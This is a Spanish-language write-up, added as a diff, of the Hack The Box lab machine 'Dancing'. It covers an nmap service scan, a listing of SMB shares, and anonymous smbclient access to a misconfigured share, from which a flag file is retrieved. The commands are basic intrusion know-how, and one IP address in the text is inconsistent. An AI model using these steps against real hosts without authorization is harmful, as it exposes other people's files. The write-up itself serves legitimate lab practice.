@@ -1,0 +1,65 @@
+Para inciar la evaluación, levanto la vpn mediante el network-manager. Posteriormente, levanto la instancia en Hack the Box, en este caso la máquina Dancing.
+
+Una vez levantada la máquina, se envía una traza ICMP a la dirección ip 10.129.7.239 para comprobar la conectividad a la misma.
+
+Una vez comprobada la conexión, se incia la fase de enumeración mediante nmap, ejecutando el comando nmap -sV 10.129.7.239 (detectar puertos abiertos y versión del servicio asociado), obteniedo como resultado lo siguiente:
+
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+En función del resultado anterior, se prueba acceder al host mediante el servicio microsoft-ds (SMB), ejecutando el comando smbclient 10.129.35.25, con usuario ghest o anonymous.
+
+Al ejecutar el cliente, se obtiene el siguiente resultado:
+
+Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+
+Se aprecia que existen 4 Shares, de los cuales 3 pueden entregarnos información de valor (todos menos IPC$, que maneja información de interprocesos).
+
+
+Al intentar acceder al share ADMIN$, se obtiene lo siguiente:
+smbclient \\\\10.129.7.239\\ADMIN$
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\test's password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+Al intentar con C$:
+
+smbclient \\\\10.129.7.239\\C$
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\test's password: 
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+Al intentar con WorkShares:
+
+ smbclient \\\\10.129.7.239\\WorkShares
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\test's password: 
+Try "help" to get a list of possible commands.
+smb: \> 
+
+En el resultado anterior se logra apreciar que el share custom WorkShares no ha sido configurado correctamente. 
+
+Una vez dentro, se ejecuta el comando ls -la para visualizar los directorios o fiecheros disponibles:
+
+smb: \Amy.J\> cd ..
+smb: \> cd James.P\
+smb: \James.P\> ls
+  .                                   D        0  Thu Jun  3 04:38:03 2021
+  ..                                  D        0  Thu Jun  3 04:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 06:26:57 2021
+get 
+		5114111 blocks of size 4096. 1751655 blocks available
+smb: \James.P\> get flag.txt 
+getting file \James.P\flag.txt of size 32 as flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
+
+Por último, para obtener el valor de la flag, se ejecuta el comando cat flag.txt | xclip -selection clipboard.
+
+
